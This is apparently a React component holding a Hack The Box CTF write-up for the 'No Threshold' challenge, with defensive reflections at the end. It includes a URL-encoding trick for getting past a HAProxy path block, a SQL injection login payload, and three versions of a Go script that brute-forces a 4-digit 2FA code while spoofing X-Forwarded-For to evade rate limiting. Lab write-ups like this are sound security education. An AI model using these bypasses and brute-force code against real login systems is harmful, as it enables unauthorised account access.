import { Codeblock } from "@/components/Codeblock";
import CustomAccordion, { AccordionType } from "@/components/CustomAccordion";
import { ImageWithCaption } from "@/components/ImageWithCaption";
import {
  Stack,
  Heading,
  Code,
  Separator,
  Text,
  Link,
  AccordionItem,
  AccordionItemContent,
  AccordionItemTrigger,
  AccordionRoot,
  Icon,
} from "@chakra-ui/react";
import { LuExternalLink } from "react-icons/lu";
import { ReflectionItem, WriteupType } from "./";
import { Hard, Python, SQLi, ACL } from "./tags";
import { FaDatabase, FaLock } from "react-icons/fa6";
import ExternalLink from "@/components/ExternalLink";
import { MdWarning } from "react-icons/md";
import { SiKnowledgebase } from "react-icons/si";

const reflectionItems: ReflectionItem[] = [
  {
    value: "sqli",
    icon: <FaDatabase />,
    title: "SQLi is still a thing",
    content: (
      <Stack gap={1}>
        <Text>
          This challenge was a good reminder that SQLi is still a thing, and
          that it can still be a very powerful attack vector. In this case, the
          SQLi was used to bypass the login page, and gain access to the admin
          dashboard. Sanitise your inputs people!
        </Text>
      </Stack>
    ),
  },
  {
    value: "2fa-brute-force",
    icon: <FaLock />,
    title: "Brute forcing 2FA",
    content: (
      <Stack gap={1}>
        <Text>
          This challenge was also a good reminder of why 2FA is so important.
          Even though we were able to bypass the 2FA, it was still a good
          reminder of why 2FA is so important. In this case, the 2FA was a
          simple 4 digit code, which meant that we could easily brute force it.
          In the real world, 2FA would be more secure, as it would be time-based
          and would (typically) be a longer code.
        </Text>
        <Text>
          In a different context, this also shows why passwords and hashes
          should be long - the longer the password, the less susceptible they
          are to brute force attacks, as the bits of work required become
          exponentially larger.
        </Text>
      </Stack>
    ),
  },
  {
    value: "x-forwarded-for",
    icon: <MdWarning />,
    title: "X-Forwarded-For header - and its dangers",
    content: (
      <Stack gap={1}>
        <Text>
          <Code>X-Forwarded-For</Code> can be a dangerous header when not
          handled correctly, since it is so easily spoofed. In this particular
          case, it was probably safest to rate limit based on the IP address of
          the client, rather than the IP address in the header.
        </Text>
        <Text>
          To add an extra layer of security, the application could utilise user
          authentication and/or API keys to reduce the reliance on the IP
          address of the client for rate-limiting.
        </Text>
      </Stack>
    ),
  },
  {
    value: "frameworks",
    icon: <SiKnowledgebase />,
    title: "Know (or learn) your frameworks",
    content: (
      <Stack gap={1}>
        <Text>
          Knowledge of the frameworks that you are using can be very beneficial
          in a CTF scenario. In this case, knowledge of Flask and uWSGI was
          beneficial in understanding how the application was working, and how
          the different components were interacting with each other.
        </Text>
      </Stack>
    ),
  },
];

export const NoThreshold: WriteupType = {
  title: "No Threshold",
  slug: "no-threshold",
  author: "dhmosfunk",
  authorLink: "https://app.hackthebox.com/users/78776",
  challengeLink: "https://app.hackthebox.com/challenges/570",
  tags: [Hard, Python, ACL, SQLi],
  timeTaken: "8 hours",
  synopsis:
    "An application that is vulnerable from poorly configured settings, SQLi and rate limiting leading to admin access.",
  content: (
    <Stack gap={2}>
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Introduction and Reconnaissance
      </Heading>
      <Text>
        This was a Python Flask app, which was a simple shop website of sorts.
        It also contained a login page, but that's really about it. This was
        also quite a challenging challenge, which multiple curveballs thrown at
        me, and the amount of time I needed to spend to circumvent them all.
        However, unlike the POP Restaurant challenge, this one had a more
        straight forward path to the flag.
      </Text>
      <ImageWithCaption
        imagePath="/images/nt-1.png"
        caption="The main page of the website"
      />
      <Text>
        Looking at the source code of the website, it looks quite simple. Within
        the <Code>conf</Code> folder, I notice that this website was using
        HAProxy as its proxy server. We also have a SQLite database, which
        contains a users table with a single users value of <Code>admin</Code>.
        Password is randomly generated, as known from the{" "}
        <Code>entrypoint.sh</Code> script.
      </Text>
      <ImageWithCaption
        imagePath="/images/nt-2.png"
        caption="Docker entrypoint script"
      />
      <Text>
        Next up, looking throughout the pages - we have two public pages, and
        two private pages. The public pages correspond to the shop and the login
        page, while the private pages correspond to a dashboard and a verify 2FA
        page. Looking inside the <Code>dashboard.html</Code>:
      </Text>
      <Codeblock
        language="html"
        code={`
<body>
    <div class="container">
        <div class="content">
            Welcome, here is your flag: <b> {{ flag }} </b>
        </div>
    </div>
</body>
`}
      />
      <Text>
        Well we know what we need to do now - somehow get to the dashboard page
        to get the flag. Also, given that the flag is not actually stored as a
        file this time, but as a variable within a Python class, we know that we
        need to somehow get to the dashboard page to get the flag.
      </Text>
      <Text>
        Looking inside the <Code>blueprints</Code> folder, it seems this is
        where most of the backend code is stored. I do notice that there is a
        decorator function that is acting as the main middleware for the
        website, redirecting users to the login page if they are not logged in.
        The login page is also utilising a library called <Code>uwsgi</Code> to
        handle login and 2FA authentication.
      </Text>
      <CustomAccordion type={AccordionType.SIDETRACK} title="What is uWSGI?">
        <Text>
          I didn't know what uWSGI was, so I did a quick search. uWSGI is a web
          server that is used to serve Python applications, and describes how a
          web server should communicate with a Python application. That is to
          say, it wasn't necessarily handling the login and 2FA logic, but was
          instead handling the communication between the Python application and
          the web server, and holding information like in the cache with the 2FA
          code.
        </Text>
        <Text>
          Looking up some quick vulnerabilities, I found one particular CVE,{" "}
          <Link
            href="https://www.cve.org/CVERecord?id=CVE-2018-7490"
            target="_blank"
            colorPalette="teal"
          >
            CVE-2018-7490 <LuExternalLink />
          </Link>
          . The issue is, this is quite an old CVE, and in addition to that,
          this is a file traversal vulnerability, which would be useful if the
          flag was stored in a file. It isn't in this challenge though, so maybe
          we shelve this for now.
        </Text>
      </CustomAccordion>
      <Text>
        Finally, looking at the <Code>login.py</Code> file, it seems that the
        login page is vulnerable to our old friend SQLi:
      </Text>
      <Codeblock
        language="python"
        code={`
user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )
                `}
      />
      <Text>
        The query is vulnerable to SQLi, as the username and password are
        directly concatenated into the query. This means that we can potentially
        bypass the login page by using SQLi, to gain access to the admin
        dashboard. It does seem though, that once we login we are redirected to
        a 2FA page and have to go through that as well.
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Planning
      </Heading>
      <Text>
        So my overall plan is to get to the login page, bypass the login page
        and sign in as an admin, and then brute force the 2FA code to get to the
        dashboard page, given that the 2FA code is just a 4 digit number, we
        only have 10000 options to try. Doesn't sound too bad?
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Execution
      </Heading>
      <Text>This is when I got thrown my first curveball.</Text>
      <ImageWithCaption
        imagePath="/images/nt-3.png"
        caption="Login page (or where it should be)"
      />
      <Text>
        The login page was not seemingly publicly accessible, as I was getting a
        403 Forbidden. This perplexed me, given that after reading through the
        source code multiple times, I couldn't see any rate limiting or IP
        blocking. I was stuck for an admittedly long time, until I remembered
        that we had HAProxy as the proxy server. Looking inside the
        configuration file, I found the following line:
      </Text>
      <Codeblock
        language=""
        code={`
  http-request deny if { path_beg /auth/login }
  `}
      />
      <Text>
        Yeah, that would probably be doing it. To get some ideas of how we could
        bypass this, I looked online for tricks to bypassing 403s as configured
        by proxies. Of course,{" "}
        <ExternalLink
          href="https://book.hacktricks.xyz/pentesting/pentesting-web/bypass-403"
          title="HackTricks"
        />{" "}
        came to the rescue, with a list of ways to bypass 403s.
      </Text>
      <Text>
        There were some interesting methods, such as fuzzing HTTP methods,
        fuzzing the headers, but in the context of this particular proxy
        configuration, the one that caught my eye was path fuzzing. They
        suggested that we could try to bypass the 403 by for example changing
        one character to using the Unicode equivalent. To my surprise, this
        actually worked and I was able to access the login page! In my case, I
        changed the last 'n' in login to the equivalent <Code>%6e</Code>.
      </Text>
      <ImageWithCaption imagePath="/images/nt-4.png" caption="Login page" />
      <Text>
        We're in! Now, knowing that the login page is vulnerable to SQLi, and
        knowing the structure of the query, I tried to bypass the login page by
        using the following payload:
      </Text>
      <ImageWithCaption imagePath="/images/nt-5.png" caption="SQLi payload" />
      <Text>
        The password is irrelevant, as the SQLi should ideally bypass the
        password field. This would turn the query to:
      </Text>
      <Codeblock
        language="sql"
        code={`
SELECT username, password FROM users WHERE username = 'admin' or '1'='1' AND password = 'a';
`}
      />
      <Text>
        Because of the order of operations in this case, the or is enough to
        evaluate this statement to true, even if the password is not in fact
        'a', which it isn't.
      </Text>
      <ImageWithCaption imagePath="/images/nt-6.png" />
      <Text>
        Ah crap, I forgot about the proxy configuration. Of course, the original
        coding of the login page was to send the POST request to the{" "}
        <Code>/auth/login</Code> route, which would be blocked by the proxy. I
        needed a way to bypass this. I initially considered using the Developer
        tools built into the browser to change the route, but realised this
        might have been quite tedious. Instead, I launched Burp Suite and used
        the interceptor to intercept and edit the request before it was sent.
      </Text>
      <ImageWithCaption
        imagePath="/images/nt-7.png"
        caption="Using Burp suite to intercept and edit requests"
      />
      <Text>
        Yes! We got through the login page with Burp Suite. Now, we are at the
        2FA page, as I had initially suspected.
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Brute forcing the 2FA code
      </Heading>
      <Text>
        As previously mentioned, the 2FA code is a 4 digit number, which means
        there are only 10000 possibilities - we could very easily brute force
        this with a script. So, I wrote a simple Golang script to brute force
        the 2FA code:
      </Text>
      <CustomAccordion
        type={AccordionType.CODE}
        title="Brute force script, iteration 1"
      >
        <Codeblock
          language="go"
          widthOffset="70px"
          code={`
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
)

const base = "http://localhost:1337"

func verify(code string) (bool, string, error) {
	res, err := http.PostForm(base + "/auth/verify-2fa",
		url.Values{
			"2fa-code": {code},
		},
	)

	if err != nil {
		return false, "", err
	}

	defer res.Body.Close()

	if res.StatusCode == http.StatusBadRequest {
		return false, "", nil
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return false, "", err
	}

	return true, string(body), nil
}

func generate4DigitCodes() []string {
	codes := make([]string, 0)

	for i := 0; i < 10000; i++ {
		code := fmt.Sprintf("%04d", i)
		codes = append(codes, code)
	}

	return codes
}

func main() {
	// try to login via sql injection first
	res, err := http.PostForm(base + "/auth/logi%6e",
		url.Values{
			"username": {"admin' OR '1'='1"},
			"password": {"a"},
		})

	if err != nil {
		fmt.Println(err)
		return
	}

	res.Body.Close()

	codes := generate4DigitCodes()

	// brute force 4 digit codes, with a new IP address for each request
	for i := 0; i < len(codes); i++ {
		fmt.Println("Trying code:", codes[i])

		verified, res, err := verify(codes[i])
		if err != nil {
			fmt.Println(err)
			break
		}

		if verified {
			fmt.Println(res)
			break
		}
	}
}
`}
        />
      </CustomAccordion>
      <Text>
        Running this script (testing locally), I was hit with another curveball.
      </Text>
      <ImageWithCaption imagePath="/images/nt-9.png" caption="Rate limiting" />
      <Text>
        Of course it wouldn't be that easy. The 2FA page was rate limited, and I
        was only able to make 20 requests every minute. Taking a look at the
        HAProxy configuration responsible for this however, I found that the
        rate limiting was based on the IP address of the client, as determined
        by the <Code>X-Forwarded-For</Code> header. This meant that I could
        potentially bypass the rate limiting by spoofing the IP address in the
        header.
      </Text>
      <Codeblock
        language=""
        code={`
# Parse the X-Forwarded-For header value if it exists. If it doesn't exist, add the client's IP address to the X-Forwarded-For header.
http-request add-header X-Forwarded-For %[src] if !{ req.hdr(X-Forwarded-For) -m found }

# Apply rate limit on the /auth/verify-2fa route.
acl is_auth_verify_2fa path_beg,url_dec /auth/verify-2fa

# Checks for valid IPv4 address in X-Forwarded-For header and denies request if malformed IPv4 is found. (Application accepts IP addresses in the range from 0.0.0.0 to 255.255.255.255.)
acl valid_ipv4 req.hdr(X-Forwarded-For) -m reg ^([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])$

http-request deny deny_status 400 if is_auth_verify_2fa !valid_ipv4

# Crate a stick-table to track the number of requests from a single IP address. (1min expire)
stick-table type ip size 100k expire 60s store http_req_rate(60s)

# Deny users that make more than 20 requests in a small timeframe.
http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }
      `}
      />
      <Text>
        There is some input validation on the IP address, but it is only
        checking for a valid IPv4 address, which means that we could potentially
        bypass this by using a valid IPv4 address in the header, as long as I
        generate a different IP correctly.
      </Text>
      <Text>I modified my script to fix this issue, and ran it again.</Text>
      <CustomAccordion
        type={AccordionType.CODE}
        title="Brute force script, iteration 2"
      >
        <Codeblock
          language="go"
          widthOffset="70px"
          code={`
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

// const base = "http://83.136.255.206:42202"
const base = "http://localhost:1337"

func verify(code, ip string) (bool, string, error) {
	req, err := http.NewRequest("POST", base + "/auth/verify-2fa", bytes.NewBuffer([]byte(url.Values{"2fa-code": {code}}.Encode())))
	if err != nil {
		return false, "", err
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("X-Forwarded-For", ip)

	client := &http.Client{}

	res, err := client.Do(req)
	if err != nil {
		return false, "", err
	}

	defer res.Body.Close()

	if res.StatusCode == http.StatusBadRequest {
		return false, "", nil
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return false, "", err
	}

	return true, string(body), nil
}

func generate4DigitCodes() []string {
	codes := make([]string, 0)

	for i := 0; i < 10000; i++ {
		code := fmt.Sprintf("%04d", i)
		codes = append(codes, code)
	}

	return codes
}

func generateIPv4s() []string {
	ipv4s := make([]string, 0)

	prefix := "1.1"
	for i := 0; i < 256; i++ {
		for j := 0; j < 256; j++ {
			ipv4 := fmt.Sprintf("%s.%d.%d", prefix, i, j)
			ipv4s = append(ipv4s, ipv4)
		}
	}

	return ipv4s
}

func main() {
	// try to login via sql injection first
	res, err := http.PostForm(base + "/auth/logi%6e",
		url.Values{
			"username": {"admin' OR '1'='1"},
			"password": {"a"},
		})

	if err != nil {
		fmt.Println(err)
		return
	}

	res.Body.Close()

	ipv4s := generateIPv4s()
	codes := generate4DigitCodes()

	// brute force 4 digit codes, with a new IP address for each request
	for i := 0; i < len(codes); i++ {
		fmt.Println("Trying code:", codes[i])

		verified, res, err := verify(codes[i], ipv4s[i])
		if err != nil {
			fmt.Println(err)
			break
		}

		if verified {
			fmt.Println(res)
			break
		}
	}
}
`}
        />
      </CustomAccordion>
      <Text>
        Running this script again, I was disappointed to find that the new
        script still didn't work. It would always stop at seemingly random code
        (which changes on every run), and when it stops, it would go back to the
        403 Forbidden page.
      </Text>
      <Text>
        I thought about this for a while, going back to the source code to
        figure out what was going on.
      </Text>
      <Codeblock
        language="python"
        code={`
@verify2fa_bp.route("/verify-2fa", methods=["GET", "POST"])
@requires_2fa
def verify():
    if request.method == "POST":

        code = request.form.get("2fa-code")

        if not code:
            return render_template("private/verify2fa.html", error_message="2FA code is empty!"), 400

        stored_code = uwsgi.cache_get("2fa-code").decode("utf-8")

        if code == stored_code:
            uwsgi.cache_del("2fa-code")
            session["authenticated"] = True
            return redirect("/dashboard")

        else:
            return render_template("private/verify2fa.html", error_message="Invalid 2FA Code!"), 400
    return render_template("private/verify2fa.html")
`}
      />
      <Text>
        Then I saw it - the way that successful authentication was being set was
        a simple boolean in the session storage. My current script didn't
        persist cookies or any session data, so it would successfully
        authenticate, but then the next request to redirect to the dashboard
        page would take me back to the login page, because the session data was
        not there - which ultimately led me back to the 403 Forbidden page due
        to the proxy configuration. I needed to persist the session data.
      </Text>
      <CustomAccordion
        type={AccordionType.CODE}
        title="Brute force script, third time's the charm"
      >
        <Codeblock
          widthOffset="70px"
          language="go"
          code={`
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
)

// const base = "http://83.136.255.206:42202"
const base = "http://localhost:1337"

func verify(code, ip string) (bool, string, error) {
	req, err := http.NewRequest("POST", base + "/auth/verify-2fa", bytes.NewBuffer([]byte(url.Values{"2fa-code": {code}}.Encode())))
	if err != nil {
		return false, "", err
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("X-Forwarded-For", ip)

	jar, err := cookiejar.New(nil)
	if err != nil {
		return false, "", err
	}

	client := &http.Client{
		Jar: jar,
	}

	res, err := client.Do(req)
	if err != nil {
		return false, "", err
	}

	defer res.Body.Close()

	if res.StatusCode == http.StatusBadRequest {
		return false, "", nil
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return false, "", err
	}

	return true, string(body), nil
}

func generate4DigitCodes() []string {
	codes := make([]string, 0)

	for i := 0; i < 10000; i++ {
		code := fmt.Sprintf("%04d", i)
		codes = append(codes, code)
	}

	return codes
}

func generateIPv4s() []string {
	ipv4s := make([]string, 0)

	prefix := "1.1"
	for i := 0; i < 256; i++ {
		for j := 0; j < 256; j++ {
			ipv4 := fmt.Sprintf("%s.%d.%d", prefix, i, j)
			ipv4s = append(ipv4s, ipv4)
		}
	}

	return ipv4s
}

func main() {
	// try to login via sql injection first
	res, err := http.PostForm(base + "/auth/logi%6e",
		url.Values{
			"username": {"admin' OR '1'='1"},
			"password": {"a"},
		})

	if err != nil {
		fmt.Println(err)
		return
	}

	res.Body.Close()

	ipv4s := generateIPv4s()
	codes := generate4DigitCodes()

	// brute force 4 digit codes, with a new IP address for each request
	for i := 0; i < len(codes); i++ {
		fmt.Println("Trying code:", codes[i])

		verified, res, err := verify(codes[i], ipv4s[i])
		if err != nil {
			fmt.Println(err)
			break
		}

		if verified {
			fmt.Println(res)
			break
		}
	}
}
`}
        />
      </CustomAccordion>
      <Text>
        The only difference to the script this time is the addition of a cookie
        jar to persist the session data. Running the script and praying:
      </Text>
      <ImageWithCaption
        imagePath="/images/nt-10.png"
        caption="Flag obtained!"
      />
    </Stack>
  ),
  reflection: (
    <Stack width="full" minW="100%">
      <AccordionRoot collapsible defaultValue={["info"]} variant="enclosed">
        {reflectionItems.map((item) => (
          <AccordionItem key={item.value} value={item.value} py={2}>
            <AccordionItemTrigger
              cursor="pointer"
              fontWeight={800}
              textAlign="left"
              fontSize="20px"
            >
              <Icon fontSize="28px" color="teal">
                {item.icon}
              </Icon>
              {item.title}
            </AccordionItemTrigger>
            <AccordionItemContent>{item.content}</AccordionItemContent>
          </AccordionItem>
        ))}
      </AccordionRoot>
    </Stack>
  ),
};
